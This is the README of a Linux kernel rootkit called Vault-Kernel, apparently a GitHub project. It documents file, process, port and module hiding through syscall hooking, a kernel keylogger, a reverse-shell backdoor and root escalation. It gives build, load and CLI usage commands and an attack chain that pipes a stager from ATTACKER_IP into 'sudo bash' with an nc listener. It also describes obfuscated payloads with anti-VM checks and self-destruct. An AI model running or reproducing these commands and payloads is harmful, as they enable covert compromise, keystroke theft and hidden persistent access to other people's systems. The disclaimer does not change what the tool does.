<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=rect&color=CC0000&height=100&section=header&text=Vault-Kernel&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
</p>

<p align="center">
  <strong>Linux Kernel Rootkit v3.0</strong><br/>
  <em>Post-exploitation persistence, kernel-level hiding, and root escalation.</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/C-Kernel-555555?style=for-the-badge&logo=c&logoColor=white" alt="C"/>
  <img src="https://img.shields.io/badge/Go-Client-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go"/>
  <img src="https://img.shields.io/badge/version-3.0-red?style=for-the-badge" alt="Version"/>
  <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License"/>
  <img src="https://img.shields.io/badge/kernel-5.4--6.6+-orange?style=for-the-badge" alt="Kernel"/>
</p>

<p align="center">
  <img src="https://komarev.com/ghpvc/?username=Ruby570bocadito&label=Downloads&color=CC0000&style=flat" alt="downloads"/>
</p>

---

## 🎯 What is Vault-Kernel?

**Vault-Kernel** is a Linux kernel rootkit designed for **red team operations** and **security research**. It provides kernel-level process/file/port hiding, a keylogger, reverse shell backdoor, privilege escalation, and self-hiding capabilities — all controlled via a zero-dependency Go CLI.

```
┌─────────────────────────────────────────────────────────┐
│                    Linux Kernel Space                     │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────┐ │
│  │ file_hide│ │ proc_hide│ │ net_hide │ │  keylogger  │ │
│  │ getdents64│ │ PID filter│ │ /proc/net│ │  notifier   │ │
│  └────┬─────┘ └────┬─────┘ └────┬─────┘ └──────┬──────┘ │
│       │            │            │               │         │
│  ┌────┴────────────┴────────────┴───────────────┴──────┐ │
│  │              syscall_table hooking                   │ │
│  │              WP bypass + RCU sync                    │ │
│  └────────────────────────┬────────────────────────────┘ │
│                           │                              │
│  ┌────────────────────────┴────────────────────────────┐ │
│  │              /dev/Vault-Kernel (ioctl)                   │ │
│  └────────────────────────┬────────────────────────────┘ │
└───────────────────────────┼──────────────────────────────┘
                            │
┌───────────────────────────┼──────────────────────────────┐
│                    Userland Space                         │
│  ┌───────────────────────┴──────────────────────────────┐│
│  │              Vault-Kernel CLI (Go, 0 deps)                ││
│  │  give-root │ hide-file │ hide-pid │ shell │ keylog   ││
│  └──────────────────────────────────────────────────────┘│
└──────────────────────────────────────────────────────────┘
```

---

## ⚡ Features

| Feature | Technique | Stealth Level |
|---------|-----------|---------------|
| **Hide Files/Directories** | Hook `getdents64`, `openat`, `unlinkat` — invisible to `ls`, `find`, `stat` | 🔴 High |
| **Hide Processes** | PID filtering in `/proc` — invisible to `ps`, `top`, `htop` | 🔴 High |
| **Hide Network Ports** | Filter `/proc/net/tcp*` and `/proc/net/udp*` — invisible to `netstat`, `ss` | 🔴 High |
| **Kernel Keylogger** | Keyboard notifier chain — captures keys before X11/Wayland | 🔴 High |
| **Reverse Shell** | `call_usermodehelper()` via workqueue — no disk touch, no visible fork | 🔴 High |
| **Magic Packet Backdoor** | Trigger via `kill()` syscall — no open port required | 🟡 Medium |
| **Instant Root Escalation** | Direct `cred` manipulation — root any process instantly | 🔴 High |
| **Hide from lsmod** | `list_del` from module list + `kobject_del` — invisible to `lsmod` | 🔴 High |
| **Self-Hiding Module** | Removes itself from kernel module list | 🔴 High |

---

## 🚀 Quick Start

### Prerequisites

```bash
# Build dependencies
sudo apt install build-essential linux-headers-$(uname -r) golang-go
```

### Build & Load

```bash
# 1. Build kernel module
cd src && make

# 2. Load into kernel
sudo insmod Vault-Kernel.ko

# 3. Build Go client
cd ../client/go && go build -o Vault-Kernel ./cmd/Vault-Kernel/

# 4. Verify it's loaded
sudo ./Vault-Kernel status
```

### Usage

```bash
# Escalate to root instantly
sudo ./Vault-Kernel give-root

# Hide a file from ls/find/stat
sudo ./Vault-Kernel hide-file mal.sh

# Hide a process from ps/top
sudo ./Vault-Kernel hide-pid 1337

# Hide a network port from netstat/ss
sudo ./Vault-Kernel hide-port 4444

# Hide the rootkit from lsmod
sudo ./Vault-Kernel hide-module

# Spawn reverse shell
sudo ./Vault-Kernel shell 10.0.0.5:1337

# Read captured keystrokes
sudo ./Vault-Kernel keylog

# List all hidden objects
sudo ./Vault-Kernel list
```

---

## 🎬 Demo

### Full Attack Chain (30 seconds)

```bash
# Terminal 1 — Attacker
cd Vault-Kernel/payloads
python3 payload.py                  # Generate bash_stager.sh
python3 -m http.server 8080 &       # Serve payload
nc -lvnp 4444                       # Listener for reverse shell

# Terminal 2 — Target (Linux VM)
curl -s http://ATTACKER_IP:8080/bash_stager.sh | sudo bash
```

**Result:** Rootkit compiled → loaded → hidden from `lsmod` → reverse shell active → persistence installed → dropper self-destructs.

### CLI Session

```
$ sudo ./Vault-Kernel status
[+] Vault-Kernel module is loaded

$ sudo ./Vault-Kernel give-root
[+] Root privileges granted to PID 1337

$ sudo ./Vault-Kernel hide-file /tmp/.hidden_malware
[+] File hidden: /tmp/.hidden_malware

$ sudo ./Vault-Kernel hide-pid 666
[+] Process hidden: PID 666

$ sudo ./Vault-Kernel hide-port 4444
[+] Port hidden: 4444/tcp

$ sudo ./Vault-Kernel list
Hidden files : 1
Hidden PIDs  : 1
Hidden ports : 1
Module hidden: yes

$ sudo ./Vault-Kernel keylog
Captured: password123[Enter]sudo su[Enter]...

$ sudo ./Vault-Kernel shell 10.0.0.5:1337
[+] Reverse shell initiated to 10.0.0.5:1337
```

---

## 🏗️ Architecture

### Kernel Module (C)

```
src/
├── main.c          init/exit, sys_call_table find, WP bypass
├── hooking.c       install/remove hooks + RCU sync
├── file_hide.c     getdents64/getdents/openat/unlinkat hooks
├── proc_hide.c     PID hiding + kill hook (magic backdoor)
├── net_hide.c      /proc/net/* filtering via read hook
├── keylogger.c     keyboard notifier chain
├── backdoor.c      reverse shell + magic packet trigger
├── priv_esc.c      give_root via cred manipulation
├── stealth.c       hide from lsmod + kobject_del
├── ioctl.c         /dev/Vault-Kernel char device
├── core.h          headers + ioctl constants
└── Makefile
```

### Userland Client (Go)

```
client/go/
├── cmd/Vault-Kernel/main.go    14 commands, zero dependencies
└── internal/ioctl/         ioctl wrapper + 15 unit tests
```

### Payload Generator (Python)

```
payloads/
├── payload.py              Interactive generator (3 formats)
└── builder.sh              CLI wrapper
```

### Payload Formats

| Format | Size | Dependencies | Persistence | Anti-VM |
|--------|------|--------------|-------------|---------|
| **Bash dropper** | ~19KB | gcc required | systemd + rc.local | 5 checks |
| **Python stager** | ~0.8KB | Python 3 | No | No |
| **C stager** | ~4KB src → ~15KB bin | libc only | No | sleep guard |

Each payload includes: XOR obfuscation (bash), camouflaged logging (syslog), self-destruct, Firefox User-Agent.

---

## 📋 All CLI Commands

```bash
Vault-Kernel status              # Check if module is loaded
Vault-Kernel give-root [pid]     # Grant root to a process
Vault-Kernel hide-file <name>    # Hide file/directory
Vault-Kernel unhide-file <name>  # Unhide file/directory
Vault-Kernel hide-pid <pid>      # Hide process
Vault-Kernel unhide-pid <pid>    # Unhide process
Vault-Kernel hide-port <port>    # Hide network port
Vault-Kernel unhide-port <port>  # Unhide network port
Vault-Kernel list                # List all hidden objects
Vault-Kernel shell <ip:port>     # Initiate reverse shell
Vault-Kernel magic <word>        # Activate backdoor without open port
Vault-Kernel keylog              # Read captured keystrokes
Vault-Kernel keylog-clear        # Clear keylogger buffer
Vault-Kernel hide-module         # Hide rootkit from lsmod
Vault-Kernel unhide-module       # Make module visible again
```

---

## 🧪 Testing

```bash
# Unit tests (Go, 15 tests)
cd client/go && go test ./... -v

# Integration tests (requires VM with module loaded)
sudo bash tests/integration.sh

# Docker build + test network
bash docker/build.sh              # Compile .ko in container
bash docker/test.sh up            # Start 3-node test network
docker exec -it rooteame-attacker bash
bash docker/test.sh down          # Cleanup
```

---

## 🔧 Kernel Compatibility

| Kernel Version | Status | Notes |
|----------------|--------|-------|
| **5.4 — 5.6** | ✅ Supported | `kallsyms_lookup_name` exported |
| **5.7 — 5.x** | ✅ Supported | kprobe fallback |
| **6.0 — 6.6+** | ✅ Supported | `class_create()` adapted |
| **WSL2** | ❌ Not supported | No kernel headers |

---

## 🗺️ Roadmap

- [ ] ARM64 kernel support
- [ ] eBPF-based detection evasion
- [ ] Encrypted keylogger buffer
- [ ] Automatic kernel version detection + adaptation
- [ ] Userland rootkit component
- [ ] Integration with peekaboo for full attack chain
- [ ] C2 integration (BTY framework)

---

## ⚠️ Disclaimer

This tool is designed for **authorized security testing**, **red team operations**, and **educational purposes** only.

- Use only on systems you own or have explicit written permission to test
- Kernel-level modifications can cause system instability or crashes
- Misuse may violate local and international laws
- The author is not responsible for any misuse or damage caused by this tool

---

<p align="center">
  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
</p>
